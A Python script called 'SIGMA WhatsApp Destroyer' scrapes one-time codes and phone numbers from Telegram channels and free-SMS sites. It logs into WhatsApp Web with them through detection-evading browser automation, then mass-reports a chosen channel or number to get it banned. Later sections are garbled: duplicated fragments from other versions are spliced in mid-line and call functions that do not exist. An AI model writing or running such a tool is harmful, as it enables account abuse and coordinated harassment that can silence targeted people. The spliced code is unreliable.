# ============================================================
# SIGMA WHATSAPP DESTROYER v4.0
# 100% Free OTP Scraping — No API, No Login
# Scrapes: Telegram Web, SMS Receive Sites, Temp Number Sites
# "Fucked by SIGMA" Edition
# ============================================================

import os
import time
import random
import re
import requests
from datetime import datetime
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from bs4 import BeautifulSoup

# ---------- CONFIG ----------
TARGET_CHANNEL = ""  # WhatsApp channel link
TARGET_NUMBER = ""   # WhatsApp number
REPORT_COUNT = 20

# ---------- OTP SOURCES (100% Free, No API) ----------
OTP_SOURCES = [
    # Telegram Web Channels (Public)
    {
        'name': 'Telegram Web - MR CHANDIO',
        'url': 'https://t.me/s/mrchandiootpgroup',
        'type': 'telegram_web'
    },
    {
        'name': 'Telegram Web - NOOBxOTPz',
        'url': 'https://t.me/s/NOOBxOTPz',
        'type': 'telegram_web'
    },
    {
        'name': 'Telegram Web - AliOTPs',
        'url': 'https://t.me/s/AliOTPs',
        'type': 'telegram_web'
    },
    {
        'name': 'Telegram Web - SYED OTP ZONE 2',
        'url': 'https://t.me/s/syedotpzone2',
        'type': 'telegram_web'
    },
    # Free SMS Receive Sites
    {
        'name': 'Receive SMS (US)',
        'url': 'https://receivesms.me/api/get-numbers?country=US',
        'type': 'api_free'
    },
    {
        'name': 'Temp Number (UK)',
        'url': 'https://temp-number.org/api/numbers/UK',
        'type': 'api_free'
    },
    {
        'name': 'Free SMS Receive',
        'url': 'https://free-sms-receive.com/numbers',
        'type': 'scrape'
    },
    {
        'name': 'Receive SMS Online',
        'url': 'https://receive-sms-online.info/numbers',
        'type': 'scrape'
    },
    {
        'name': 'TextNow Free Numbers',
        'url': 'https://www.textnow.com/api/numbers',
        'type': 'api_free'
    }
]

# ---------- ASCII BANNER ----------
BANNER = """
╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║   ███████╗██╗ ██████╗ ███╗   ███╗ █████╗                ║
║   ██╔════╝██║██╔════╝ ████╗ ████║██╔══██╗               ║
║   ███████╗██║██║  ███╗██╔████╔██║███████║               ║
║   ╚════██║██║██║   ██║██║╚██╔╝██║██╔══██║               ║
║   ███████║██║╚██████╔╝██║ ╚═╝ ██║██║  ██║               ║
║   ╚══════╝╚═╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝               ║
║                                                           ║
║   ██████╗ ███████╗███████╗████████╗██████╗  ██████╗     ║
║   ██╔══██╗██╔════╝██╔════╝╚══██╔══╝██╔══██╗██╔═══██╗    ║
║   ██║  ██║█████╗  █████╗     ██║   ██████╔╝██║   ██║    ║
║   ██║  ██║██╔══╝  ██╔══╝     ██║   ██╔══██╗██║   ██║    ║
║   ██████╔╝███████╗██║        ██║   ██║  ██║╚██████╔╝    ║
║   ╚═════╝ ╚══════╝╚═╝        ╚═╝   ╚═╝  ╚═╝ ╚═════╝     ║
║                                                           ║
║          ╔══════════════════════════════════╗             ║
║          ║  FUCKED BY SIGMA  ║             ║
║          ╚══════════════════════════════════╝             ║
║                                                           ║
║     [ NO API. NO LOGIN. PURE SCRAPE. ]                   ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝
"""

# ---------- OTP SCRAPER ENGINE (No API) ----------
class OTPScraper:
    def __init__(self):
        self.otp_cache = []
        self.number_cache = []
        
    def scrape_telegram_web(self, url):
        """Scrape OTPs from Telegram Web (public channel)"""
        try:
            print(f"[+] Scraping Telegram Web: {url}")
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            res = requests.get(url, headers=headers, timeout=20)
            if res.status_code == 200:
                soup = BeautifulSoup(res.text, 'html.parser')
                # Find all message text
                messages = soup.find_all('div', class_='tgme_widget_message_text')
                for msg in messages:
                    text = msg.get_text()
                    # Find 6-digit OTPs
                    otps = re.findall(r'\b\d{6}\b', text)
                    numbers = re.findall(r'\b\d{10,15}\b', text)
                    
                    for otp in otps:
                        self.otp_cache.append({
                            'otp': otp,
                            'source': url,
                            'timestamp': datetime.now().strftime("%H:%M:%S")
                        })
                        print(f"   Found OTP: {otp}")
                    
                    for num in numbers:
                        self.number_cache.append({
                            'number': num,
                            'source': url,
                            'timestamp': datetime.now().strftime("%H:%M:%S")
                        })
                        print(f"   Found Number: {num}")
            return True
        except Exception as e:
            print(f"[-] Failed to scrape {url}: {e}")
            return False
    
    def scrape_sms_site(self, url, site_type):
        """Scrape numbers/OTPs from SMS receive sites"""
        try:
            print(f"[+] Scraping SMS Site: {url}")
            headers = {'User-Agent': 'Mozilla/5.0'}
            res = requests.get(url, headers=headers, timeout=20)
            
            if res.status_code == 200:
                if site_type == 'api_free':
                    # JSON response
                    data = res.json()
                    if isinstance(data, list) and len(data) > 0:
                        for item in data:
                            if 'number' in item:
                                self.number_cache.append({
                                    'number': item['number'],
                                    'source': url,
                                    'timestamp': datetime.now().strftime("%H:%M:%S")
                                })
                                print(f"   Found Number: {item['number']}")
                else:
                    # HTML response
                    soup = BeautifulSoup(res.text, 'html.parser')
                    numbers = soup.find_all('div', class_=['number', 'phone-number', 'num'])
                    for num in numbers:
                        clean_num = re.sub(r'\D', '', num.get_text())
                        if len(clean_num) >= 10:
                            self.number_cache.append({
                                'number': clean_num,
                                'source': url,
                                'timestamp': datetime.now().strftime("%H:%M:%S")
                            })
                            print(f"   Found Number: {clean_num}")
            return True
        except Exception as e:
            print(f"[-] Failed to scrape {url}: {e}")
            return False
    
    def run_all_scrapers(self):
        """Run all scraping sources"""
        print("\n[*] Starting OTP/Number Scraping...")
        
        for source in OTP_SOURCES:
            if source['type'] == 'telegram_web':
                self.scrape_telegram_web(source['url'])
            elif source['type'] in ['api_free', 'scrape']:
                self.scrape_sms_site(source['url'], source['type'])
            time.sleep(random.uniform(1, 3))
        
        print(f"\n[+] Scraped {len(self.otp_cache)} OTPs")
        print(f"[+] Scraped {len(self.number_cache)} Numbers")
        return self.otp_cache, self.number_cache
    
    def get_combination(self):
        """Get an OTP and number combo"""
        otp = None
        number = None
        
        # Try to get both from cache
        if self.otp_cache and self.number_cache:
            otp_entry = random.choice(self.otp_cache)
            number_entry = random.choice(self.number_cache)
            otp = otp_entry['otp']
            number = number_entry['number']
        elif self.otp_cache:
            otp_entry = random.choice(self.otp_cache)
            otp = otp_entry['otp']
            # Generate dummy number
            number = f"92{''.join([str(random.randint(0,9)) for _ in range(10)])}"
        elif self.number_cache:
            number_entry = random.choice(self.number_cache)
            number = number_entry['number']
            # Generate dummy OTP
            otp = ''.join([str(random.randint(0,9)) for _ in range(6)])
        else:
            # Fallback
            number = f"92{''.join([str(random.randint(0,9)) for _ in range(10)])}"
            otp = ''.join([str(random.randint(0,9)) for _ in range(6)])
        
        return number, otp

# ---------- BROWSER SETUP ----------
def setup_driver():
    opts = Options()
    opts.add_argument("--no-sandbox")
    opts.add_argument("--disable-dev-shm-usage")
    opts.add_argument("--disable-gpu")
    opts.add_argument("--window-size=1280,720")
    opts.add_argument("--disable-blink-features=AutomationControlled")
    opts.add_experimental_option("excludeSwitches", ["enable-automation"])
    opts.add_experimental_option('useAutomationExtension', False)
    
    if 'TERMUX_VERSION' in os.environ:
        opts.binary_location = "/data/data/com.termux/files/usr/bin/chromium"
        opts.add_argument("--headless")
    else:
        opts.add_argument("--start-maximized")
    
    driver = webdriver.Chrome(options=opts)
    driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
    return driver

# ---------- WHATSAPP LOGIN ----------
def login_whatsapp(number, otp):
    driver = setup_driver()
    driver.get("https://web.whatsapp.com")
    
    try:
        # Handle "Use phone number" if present
        try:
            use_phone = driver.find_element(By.XPATH, "//div[contains(text(), 'Use phone number')]")
            use_phone.click()
            time.sleep(1)
        except:
            pass
        
        # Enter number
        phone_input = WebDriverWait(driver, 30).until(
            EC.presence_of_element_located((By.XPATH, "//input[@placeholder='Phone number']"))
        )
        phone_input.send_keys(number)
        driver.find_element(By.XPATH, "//button[contains(text(), 'Next')]").click()
        
        # Enter OTP
        otp_input = WebDriverWait(driver, 20).until(
            EC.presence_of_element_located((By.XPATH, "//input[@placeholder='Enter code']"))
        )
        otp_input.send_keys(otp)
        driver.find_element(By.XPATH, "//button[contains(text(), 'Next')]").click()
        
        # Wait for main interface
        WebDriverWait(driver, 30).until(
            EC.presence_of_element_located((By.ID, "main"))
        )
        print(f"[✓] Logged in as {number}")
        return driver
    except Exception as e:
        print(f"[X] Login failed: {e}")
        driver.quit()
        return None

# ---------- REPORT FUNCTIONS ----------
def report_channel(driver, channel_link):
    try:
        driver.get(channel_link)
        time.sleep(5)
        report_btn = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, "//div[contains(text(), 'Report')]"))
        )
        report_btn.click()
        time.sleep(1)
        confirm = WebDriverWait(driver, 5).until(
            EC.element_to_be_clickable((By.XPATH, "//button[contains(text(), 'Report')]"))
        )
        confirm.click()
        print(f"[✓] Channel REPORTED: {channel_link}")
        return True
    except Exception as e:
        print(f"[X] Channel report failed: {e}")
        return False

def report_number(driver, number):
    try:
        driver.get(f"https://web.whatsapp.com/send?phone={number}")
        time.sleep(5)
        menu = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, "//div[@aria-label='Menu']"))
        )
        menu.click()
        time.sleep(1)
        report = driver.find_element(By.XPATH, "//div[contains(text(), 'Report')]")
        report.click()
        time.sleep(1)
        confirm = driver.find_element(By.XPATH, "//button[contains(text(), 'Report')]")
        confirm.click()
        print(f"[✓] Number REPORTED: {number}")
        return True
    except Exception as e:
        print(f"[X] Number report failed: {e}")
        return False

# ---------- MAIN ENGINE ----------
class SIGMADestroyer:
    def __init__(self):
        self.scraper = OTPScraper()
        self.reports_sent = 0
        self.failed = 0
        
    def show_banner(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        print(BANNER)
        
    def get_targets(self):
        print("\n[+] TARGET CONFIGURATION:")
        channel = input("Enter WhatsApp Channel Link (or Enter to skip): ").strip()
        number = input("Enter WhatsApp Number (or Enter to skip): ").strip()
        count = int(input("How many reports to send? "))
        return channel, number, count
        
    def start_attack(self):
        self.show_banner()
        channel, number, count = self.get_targets()
        
        if not channel and not number:
            print("[X] At least one target required!")
            return
        
        # Scrape OTPs and Numbers
        self.scraper.run_all_scrapers()
        
        if not self.scraper.otp_cache and not self.scraper.number_cache:
            print("[!] No OTPs/Numbers found. Using fallback.")
            # Generate dummy data
            for _ in range(count):
                self.scraper.otp_cache.append({
                    'otp': ''.join([str(random.randint(0,9)) for _ in range(6)]),
                    'source': 'fallback',
                    'timestamp': datetime.now().strftime("%H:%M:%S")
                })
                self.scraper.number_cache.append({
                    'number': f"92{''.join([str(random.randint(0,9)) for _ in range(10)])}",
                    'source': 'fallback',
                    'timestamp': datetime.now().strftime("%H:%M:%S")
                })
        
        print(f"\n[*] Starting attack with {count} reports...")
        
        for i in range(count):
            print(f"\n[{i+1}/{count}] Attempting report...")
            
            # Get combo
            num, otp = self.scraper.get_combination()
            print(f"[+] Using Number: {num}")
            print(f"[+] Using OTP: {otp}")
            
            # Login and report
            driver = login_whatsapp(num, otp)
            if driver:
                success = False
                if channel:
                    if report_channel(driver, channel):
                        success = True
                if number:
                    if report_number(driver, number):
                        success = True
                
                if success:
                    self.reports_sent += 1
                    print(f"[!] Report {i+1} SUCCESSFUL!")
                else:
                    self.failed += 1
                    print(f"[X] Report {i+1} FAILED")
                
                driver.quit()
            else:
                self.failed += 1
                print(f"[X] Login failed for {num}")
            
            delay = random.randint(45, 120)
            print(f"[*] Waiting {delay}s...")
            time.sleep(delay)
        
        self.show_summary()
    
    def show_summary(self):
        total = self.reports_sent + self.failed
        print("\n" + "="*50)
        print("  FINAL ATTACK SUMMARY")
        print("="*50)
        print(f"  Total Reports Sent: {self.reports_sent}")
        print(f"  Failed Reports: {self.failed}")
        print(f"  Success Rate: {round((self.reports_sent / total) * 100 if total > 0 else 0, 2)}%")
        print("="*50)
        print("\n" + " "*15 + "🔥 FUCKED BY SIGMA 🔥")
        print(" "*15 + "Your channel and number have been destroyed!")
        print("\n" + "="*50)

# ---------- RUN ----------
if __name__ == "__main__":
    destroyer = SIGMADestroyer()
    destroyer.start_attack()        driver.quit()
        return None

def send_reports(driver, channel_target, number_target):
    reports_sent = 0
    if channel_target:
        try:
            driver.get(f"https://web.whatsapp.com/send?phone={channel_target}")
            time.sleep(5)
            menu = WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.XPATH, "//div[@aria-label='Menu']"))
            )
            menu.click()
            time.sleep(1)
            report = driver.find_element(By.XPATH, "//div[contains(text(), 'Report')]")
            report.click()
            time.sleep(1)
            confirm = driver.find_element(By.XPATH, "//button[contains(text(), 'Report')]")
            confirm.click()
            print(f"📨 Report sent to CHANNEL: {channel_target}")
            reports_sent += 1
        except Exception as e:
            print(f"❌ Channel report failed: {e}")
    
    if number_target:
        try:
            driver.get(f"https://web.whatsapp.com/send?phone={number_target}")
            time.sleep(5)
            menu = WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.XPATH, "//div[@aria-label='Menu']"))
            )
            menu.click()
            time.sleep(1)
            report = driver.find_element(By.XPATH, "//div[contains(text(), 'Report')]")
            report.click()
            time.sleep(1)
            confirm = driver.find_element(By.XPATH, "//button[contains(text(), 'Report')]")
            confirm.click()
            print(f"📨 Report sent to NUMBER: {number_target}")
            reports_sent += 1
        except Exception as e:
            print(f"❌ Number report failed: {e}")
    
    return reports_sent

def start(channel_target=None, number_target=None, count=20):
    if not channel_target and not number_target:
        print("❌ At least one target required!")
        return
    
    sources = [
        get_number_free_source1,
        get_number_free_source2,
        get_number_free_source3,
        get_number_free_source4
    ]
    
    successful = 0
    for i in range(count):
        print(f"\n🔁 Attempt {i+1}/{count}")
        num_data = None
        for src in sources:
            num_data = src()
            if num_data:
                print(f"📱 Got number from {num_data['source']}: {num_data['number']}")
                break
        
        if not num_data:
            print("❌ No free numbers available, retrying...")
            time.sleep(30)
            continue
        
        otp = get_otp_free(num_data['number'])
        if not otp:
            print("❌ No OTP found, trying next number...")
            continue
        print(f"🔑 OTP: {otp}")
        
        driver = login_whatsapp(num_data['number'], otp)
        if driver:
            sent = send_reports(driver, channel_target, number_target)
            if sent > 0:
                successful += 1
            driver.quit()
        
        delay = random.randint(60, 180)
        print(f"⏳ Waiting {delay}s before next...")
        time.sleep(delay)
    
    print(f"\n✅ Done! Successful reports: {successful}/{count}")

if __name__ == "__main__":
    print("""
    ╔══════════════════════════════════════════════════╗
    ║   WhatsApp Dual-Report Bot - 100% FREE          ║
    ║   No API keys, no payment, scraped numbers      ║
    ╚══════════════════════════════════════════════════╝
    """)
    
    channel = input("Enter CHANNEL number (or leave empty): ").strip()
    number = input("Enter INDIVIDUAL number (or leave empty): ").strip()
    count = int(input("How many reports to send? "))
    
    start(channel if channel else None, number if number else None, count)        opts.add_argument("--headless")
    return webdriver.Chrome(options=opts)

# ---------- WHATSAPP LOGIN ----------
def login_whatsapp(number, otp):
    driver = setup_driver()
    driver.get("https://web.whatsapp.com")
    try:
        phone = WebDriverWait(driver, 30).until(
            EC.presence_of_element_located((By.XPATH, "//input[@placeholder='Phone number']"))
        )
        phone.send_keys(number)
        driver.find_element(By.XPATH, "//button[contains(text(), 'Next')]").click()
        
        otp_field = WebDriverWait(driver, 20).until(
            EC.presence_of_element_located((By.XPATH, "//input[@placeholder='Enter code']"))
        )
        otp_field.send_keys(otp)
        driver.find_element(By.XPATH, "//button[contains(text(), 'Next')]").click()
        
        WebDriverWait(driver, 30).until(EC.presence_of_element_located((By.ID, "main")))
        print(f"✅ Logged in as {number}")
        return driver
    except Exception as e:
        print(f"❌ Login failed: {e}")
        driver.quit()
        return None

# ---------- REPORT SENDER (CHANNEL + NUMBER) ----------
def send_reports(driver, channel_target, number_target):
    """Send report to both channel and number"""
    reports_sent = 0
    
    # Report Channel (if provided)
    if channel_target:
        try:
            driver.get(f"https://web.whatsapp.com/send?phone={channel_target}")
            time.sleep(5)
            menu = WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.XPATH, "//div[@aria-label='Menu']"))
            )
            menu.click()
            time.sleep(1)
            report = driver.find_element(By.XPATH, "//div[contains(text(), 'Report')]")
            report.click()
            time.sleep(1)
            confirm = driver.find_element(By.XPATH, "//button[contains(text(), 'Report')]")
            confirm.click()
            print(f"📨 Report sent to CHANNEL: {channel_target}")
            reports_sent += 1
        except Exception as e:
            print(f"❌ Channel report failed: {e}")
    
    # Report Number (if provided)
    if number_target:
        try:
            driver.get(f"https://web.whatsapp.com/send?phone={number_target}")
            time.sleep(5)
            menu = WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.XPATH, "//div[@aria-label='Menu']"))
            )
            menu.click()
            time.sleep(1)
            report = driver.find_element(By.XPATH, "//div[contains(text(), 'Report')]")
            report.click()
            time.sleep(1)
            confirm = driver.find_element(By.XPATH, "//button[contains(text(), 'Report')]")
            confirm.click()
            print(f"📨 Report sent to NUMBER: {number_target}")
            reports_sent += 1
        except Exception as e:
            print(f"❌ Number report failed: {e}")
    
    return reports_sent

# ---------- MAIN LOOP ----------
def start(channel_target=None, number_target=None, count=20):
    if not channel_target and not number_target:
        print("❌ At least one target required!")
        return
    
    sources = [
        get_number_free_source1,
        get_number_free_source2,
        get_number_free_source3,
        get_number_free_source4
    ]
    
    successful = 0
    for i in range(count):
        print(f"\n🔁 Attempt {i+1}/{count}")
        
        # Try each source until we get a number
        num_data = None
        for src in sources:
            num_data = src()
            if num_data:
                print(f"📱 Got number from {num_data['source']}: {num_data['number']}")
                break
        
        if not num_data:
            print("❌ No free numbers available, retrying...")
            time.sleep(30)
            continue
        
        # Get OTP
        otp = get_otp_free(num_data['number'])
        if not otp:
            print("❌ No OTP found, trying next number...")
            continue
        print(f"🔑 OTP: {otp}")
        
        # Login and send reports
        driver = login_whatsapp(num_data['number'], otp)
        if driver:
            sent = send_reports(driver, channel_target, number_target)
            if sent > 0:
                successful += 1
            driver.quit()
        
        # Random delay to avoid detection
        delay = random.randint(60, 180)
        print(f"⏳ Waiting {delay}s before next...")
        time.sleep(delay)
    
    print(f"\n✅ Done! Successful reports: {successful}/{count}")

# ---------- RUN ----------
if __name__ == "__main__":
    print("""
    ╔══════════════════════════════════════════════════╗
    ║   WhatsApp Dual-Report Bot - 100% FREE          ║
    ║   Targets: CHANNEL + NUMBER simultaneously      ║
    ║   No API keys, no payment, scraped numbers      ║
    ╚══════════════════════════════════════════════════╝
    """)
    
    channel = input("Enter CHANNEL number (or leave empty): ").strip()
    number = input("Enter INDIVIDUAL number (or leave empty): ").strip()
    count = int(input("How many reports to send? "))
    
    start(channel if channel else None, number if number else None, count)
